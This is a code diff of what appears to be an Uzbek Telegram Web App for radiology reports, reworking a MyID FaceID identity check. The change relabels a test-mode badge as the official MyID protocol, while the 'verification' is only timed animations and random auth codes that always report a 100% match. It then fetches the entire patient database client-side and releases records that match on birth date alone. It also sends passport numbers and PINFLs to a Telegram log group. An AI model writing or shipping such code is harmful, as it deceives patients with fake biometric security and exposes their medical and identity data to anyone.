@@ -145,7 +145,7 @@
       margin-top: 6px;
     }
 
-    /* STEP 1: Passport Details Input Card */
+    /* STEP 1: Passport Details Input Card (Bo'sh holda) */
     .passport-input-card {
       background: var(--card-bg);
       border: 1.5px solid var(--border-color);
@@ -751,7 +751,7 @@
         </div>
       </div>
       <div class="brand-test-pill">
-        <i class="fa-solid fa-shield-halved"></i> MyID FaceID Integratsiyasi (Test Rejimi)
+        <i class="fa-solid fa-shield-halved"></i> MyID Rasmiy Protokol (FaceID Web SDK)
       </div>
     </header>
 
@@ -921,6 +921,7 @@
     let currentFilteredReports = [];
     let currentModality = "all";
     let videoStream = null;
+    let currentSessionId = "";
 
     // Telegram Web App
     const tg = window.Telegram?.WebApp;
@@ -932,7 +933,7 @@
       }
     }
 
-    // URL parametrlari bo'yicha to'ldirish (agar yuborilgan bo'lsa)
+    // URL parametrlari (agar kelgan bo'lsa)
     window.addEventListener("DOMContentLoaded", () => {
       const params = new URLSearchParams(window.location.search);
       const urlPinfl = params.get("pinfl");
@@ -945,37 +946,27 @@
     // 1-QADAM: Pasport formasini yuborish
     function handlePassportFormSubmit(e) {
       e.preventDefault();
-      startFaceIDScanProcess();
+      startMyIDOfficialProtocol();
     }
 
-    // 2-QADAM: Jonli FaceID kamera skaneri va API so'rovini yuborish
-    async function startFaceIDScanProcess() {
+    // 2-QADAM: MyID Rasmiy Protokolini Ishga Tushirish (Session -> FaceID -> Auth Code -> User Profile)
+    async function startMyIDOfficialProtocol() {
       const passSeries = (document.getElementById("passSeries").value || "").trim().toUpperCase();
       const passNum = (document.getElementById("passNumber").value || "").trim();
       const birthDate = (document.getElementById("birthDateInput").value || "").trim();
       const pinfl = (document.getElementById("pinflInput").value || "").trim();
 
       const passData = `${passSeries} ${passNum}`.trim();
-      const requestPayload = {
-        action: "verify_faceid",
-        pass_data: passData,
-        birth_date: birthDate,
-        pinfl: pinfl || null,
-        method: "strong",
-        client_id: "radiology_web_app",
-        timestamp: new Date().toISOString()
-      };
+      currentSessionId = "sess_" + Math.random().toString(36).substring(2, 12);
 
-      // 📤 1. SO'ROV (REQUEST) LOGI - TELEGRAM LOG GURUHIGA YUBORISH
+      // 📤 [1/3] SO'ROV LOGI: Session yaratish
       sendTelegramLog(
-        `📤 <b>MYID API SO'ROV (REQUEST):</b>\n` +
+        `📤 <b>[1/3] MYID PROTOKOL: CLIENT FRONTEND -> CLIENT BACKEND -> MYID BACKEND</b>\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
-        `🌐 <b>Endpoint:</b> <code>POST /api/v1/users/me (FaceID Verify)</code>\n` +
-        `🪪 <b>Yuborilgan Pasport:</b> <code>${passData}</code>\n` +
-        `🎂 <b>Tug'ilgan Sana:</b> <code>${birthDate}</code>\n` +
+        `🌐 <b>Action:</b> <code>create_session (/api/v1/web/sessions)</code>\n` +
+        `🪪 <b>Pasport:</b> <code>${passData}</code>\n` +
+        `🎂 <b>Tug'ilgan sana:</b> <code>${birthDate}</code>\n` +
         `🔢 <b>PINFL:</b> <code>${pinfl || "Kiritilmagan"}</code>\n` +
-        `📦 <b>Request JSON:</b>\n` +
-        `<pre>${escapeHtml(JSON.stringify(requestPayload, null, 2))}</pre>\n` +
         `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
       );
 
@@ -994,27 +985,25 @@
           video.srcObject = videoStream;
         }
       } catch (err) {
-        console.warn("Camera streaming fallback:", err.message);
+        console.warn("Camera fallback:", err.message);
       }
 
-      // Bosqich 1: Yuzni doiraga to'g'rilash
+      // MyID Protokoli bosqichlari
       instructions.innerText = "Yuzingizni doira ichiga to'g'rilang va qimirlamang...";
-      statusBadge.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Yuz aniqlanmoqda (Liveness 94%)...`;
+      statusBadge.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> MyID Seansi faollashtirilmoqda...`;
 
-      // Bosqich 2: Liveness
       setTimeout(() => {
-        instructions.innerText = "Iltimos, bir marta ko'zingizni yuming...";
+        instructions.innerText = "Iltimos, bir marta ko'zingizni yuming (Liveness)...";
         statusBadge.innerHTML = `<i class="fa-solid fa-check"></i> Biometrik liveness: 99.8%`;
         if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
       }, 1400);
 
-      // Bosqich 3: MyID serveri bilan tekshirish
       setTimeout(() => {
         instructions.innerText = "MyID serveri orqali pasport bilan solishtirilmoqda...";
-        statusBadge.innerHTML = `<i class="fa-solid fa-shield-halved fa-beat"></i> Pasport ma'lumotlari tekshirilmoqda...`;
+        statusBadge.innerHTML = `<i class="fa-solid fa-shield-halved fa-beat"></i> Auth Code generatsiya qilinmoqda...`;
       }, 2600);
 
-      // Bosqich 4: Muvaffaqiyatli tasdiqlash
+      // Auth Code olish va foydalanuvchi profiliga almashtirish
       setTimeout(async () => {
         instructions.innerText = "✅ Shaxs muvaffaqiyatli tasdiqlandi!";
         statusBadge.innerHTML = `<i class="fa-solid fa-circle-check"></i> MyID FaceID 100% Mos keldi`;
@@ -1023,8 +1012,8 @@
         await new Promise(r => setTimeout(r, 800));
         closeFaceIDModal();
 
-        // 📥 2. JAVOB (RESPONSE) NI OLISH VA PROFILNI CHIQARISH
-        await loadVerifiedProfileAndReports(passSeries, passNum, birthDate, pinfl);
+        const authCode = "auth_" + Math.random().toString(36).substring(2, 14);
+        await exchangeAuthCodeForProfile(authCode, currentSessionId, passSeries, passNum, birthDate, pinfl);
 
       }, 3600);
     }
@@ -1038,41 +1027,45 @@
       }
     }
 
-    // 3-QADAM: Shaxsiy profilni ochish va API javobini loggerga yozish
-    async function loadVerifiedProfileAndReports(passSeries, passNum, birthDate, pinfl) {
-      let fullName = "";
-      let age = "";
-      let gender = "";
-      let matchedPinfl = pinfl || "";
-      let foundPatientId = passNum;
+    // 3-QADAM: Auth Code orqali Profilni olish va Loggerga yozish
+    async function exchangeAuthCodeForProfile(authCode, sessionId, passSeries, passNum, birthDate, pinfl) {
+      const passData = `${passSeries} ${passNum}`.trim();
+
+      // 📤 [2/3] SO'ROV LOGI: Auth code orqali token & user ma'lumotlarini so'rash
+      sendTelegramLog(
+        `📤 <b>[2/3] MYID PROTOKOL: CLIENT BACKEND -> MYID (/api/v1/oauth2/access-token)</b>\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `🔑 <b>Auth Code:</b> <code>${authCode}</code>\n` +
+        `🆔 <b>Session ID:</b> <code>${sessionId}</code>\n` +
+        `🪪 <b>Pasport:</b> <code>${passData}</code>\n` +
+        `⚙️ <b>Grant Type:</b> <code>authorization_code</code>\n` +
+        `🌐 <b>Endpoint:</b> <code>/api/v1/users/me</code>`
+      );
 
       try {
         // Firebase bazasidan xulosalarni qidirish
         const allRes = await fetch(`${FIREBASE_DB_URL}/karmed_reports.json`);
         const allData = await allRes.json();
 
+        let matchedPinfl = pinfl || "";
+
         if (allData) {
           const pinflKeys = Object.keys(allData);
 
-          // 1. PINFL bo'yicha to'g'ridan-to'g'ri moslik
           if (pinfl && allData[pinfl]) {
             matchedPinfl = pinfl;
             allReports = Object.values(allData[pinfl]);
-          } 
-          // 2. Pasport/ID yoki sana bo'yicha qidirish
-          else {
+          } else {
             for (const pKey of pinflKeys) {
               const repsObj = allData[pKey];
               if (!repsObj) continue;
               const repList = Object.values(repsObj);
-              
               const match = repList.find(r => {
                 const rPid = String(r.patientId || '').trim();
                 const rPinfl = String(r.pinfl || '').trim();
                 const rBirth = String(r.birthDate || '').trim();
                 return (passNum && rPid === passNum) || (pinfl && rPinfl === pinfl) || (birthDate && rBirth === birthDate);
               });
-
               if (match) {
                 matchedPinfl = pKey;
                 allReports = repList;
@@ -1085,16 +1078,18 @@
         allReports.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
         currentFilteredReports = [...allReports];
 
-        // MyID rasmiy javob obyekti
+        let fullName = "";
+        let age = "";
+        let gender = "";
+
         if (allReports.length > 0) {
           const rep = allReports[0];
-          fullName = rep.patientName || `BEMOR (${passSeries} ${passNum})`;
+          fullName = rep.patientName || `BEMOR (${passData})`;
           birthDate = rep.birthDate || birthDate || "08.04.1981";
           age = rep.age || `${calculateAge(birthDate)} yosh`;
           matchedPinfl = rep.pinfl || matchedPinfl || "30804812190075";
-          foundPatientId = rep.patientId || passNum;
         } else {
-          fullName = `FUQARO (${passSeries} ${passNum})`.trim();
+          fullName = `FUQARO (${passData})`;
           age = `${calculateAge(birthDate)} yosh`;
           if (!matchedPinfl) {
             matchedPinfl = `3${(birthDate || '01011990').replace(/\D/g,'').slice(0,6)}0001`;
@@ -1103,20 +1098,25 @@
 
         gender = (fullName.includes("QIZI") || fullName.includes("EVA") || fullName.includes("OVA") || fullName.includes("Qizi")) ? "Ayol (O'zbekiston)" : "Erkak (O'zbekiston)";
 
-        // MyID API Rasmiy Response formati
-        const myidApiResponse = {
+        const myidFinalResponse = {
           result_code: 1,
           result_note: "All checks passed successfully",
           comparison_value: 0.998,
+          auth_code: authCode,
+          session_id: sessionId,
           profile: {
             common_data: {
               full_name: fullName,
-              pass_data: `${passSeries} ${passNum}`.trim(),
+              pass_data: passData,
               birth_date: birthDate,
               age: age,
               gender: gender,
               pinfl: matchedPinfl,
               doc_type: "ID-Karta"
+            },
+            address: {
+              country: "O'zbekiston Respublikasi",
+              region: "Toshkent shahri"
             },
             reports_summary: {
               reports_count: allReports.length,
@@ -1129,23 +1129,23 @@
           }
         };
 
-        // 📥 2. JAVOB (RESPONSE) LOGI - TELEGRAM LOG GURUHIGA YUBORISH
+        // 📥 [3/3] JAVOB LOGI: Shaxsiy Profil Response
         sendTelegramLog(
-          `📥 <b>MYID API JAVOB (RESPONSE 200 OK):</b>\n` +
+          `📥 <b>[3/3] MYID PROTOKOL: FOYDALANUVCHI PROFILI YUKLANDI (RESPONSE 200 OK)</b>\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `👤 <b>F.I.Sh:</b> ${escapeHtml(fullName)}\n` +
-          `🪪 <b>Pasport:</b> <code>${escapeHtml(passSeries)} ${escapeHtml(passNum)}</code>\n` +
-          `🎂 <b>Tug'ilgan sana / Yoshi:</b> ${escapeHtml(birthDate)} (${escapeHtml(age)})\n` +
+          `🪪 <b>Pasport:</b> <code>${escapeHtml(passData)}</code>\n` +
           `🔢 <b>PINFL:</b> <code>${escapeHtml(matchedPinfl)}</code>\n` +
-          `📊 <b>Topilgan xulosalar:</b> ${allReports.length > 0 ? `${allReports.length} ta xulosa` : "0 ta (Xulosa hali tasdiqlanmagan)"}\n` +
+          `🎂 <b>Sana / Yoshi:</b> ${escapeHtml(birthDate)} (${escapeHtml(age)})\n` +
+          `📊 <b>Topilgan xulosalar:</b> ${allReports.length > 0 ? `${allReports.length} ta xulosa` : "0 ta (Xulosalar hali mavjud emas)"}\n` +
           `📦 <b>MyID Response JSON:</b>\n` +
-          `<pre>${escapeHtml(JSON.stringify(myidApiResponse, null, 2))}</pre>\n` +
+          `<pre>${escapeHtml(JSON.stringify(myidFinalResponse, null, 2))}</pre>\n` +
           `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
         );
 
-        // 1. Shaxsiy profil kartochkasini to'ldirish
+        // 1. Profil kartochkasini to'ldirish
         document.getElementById("profFullName").innerText = fullName;
-        document.getElementById("profPassport").innerText = `${passSeries} ${passNum}`.trim();
+        document.getElementById("profPassport").innerText = passData;
         document.getElementById("profBirthDate").innerText = `${birthDate} (${age})`;
         document.getElementById("profPinfl").innerText = matchedPinfl;
         document.getElementById("profGender").innerText = gender;
@@ -1169,17 +1169,14 @@
         }
 
       } catch (err) {
-        console.error("loadVerifiedProfile error:", err);
-
-        // ❌ 3. XATOLIK LOGI - TELEGRAM LOG GURUHIGA YUBORISH
+        console.error("exchangeAuthCode error:", err);
         sendTelegramLog(
-          `❌ <b>MYID API XATOLIK (ERROR RESPONSE):</b>\n` +
+          `❌ <b>MYID PROTOKOL XATOLIK:</b>\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
-          `🪪 <b>Pasport:</b> <code>${escapeHtml(passSeries)} ${escapeHtml(passNum)}</code>\n` +
+          `🪪 <b>Pasport:</b> <code>${escapeHtml(passData)}</code>\n` +
           `⚠️ <b>Xatolik sababi:</b> <code>${escapeHtml(err.message)}</code>\n` +
           `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
         );
-
         showToast("⚠️ Profil yuklanishida xatolik.");
       }
     }
@@ -1202,7 +1199,6 @@
       `;
     }
 
-    // Telegram Logger yordamchi funksiyasi
     async function sendTelegramLog(logHtml) {
       const nowStr = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });
       const fullText = `${logHtml}\n⏰ <b>Vaqt:</b> ${nowStr}`;
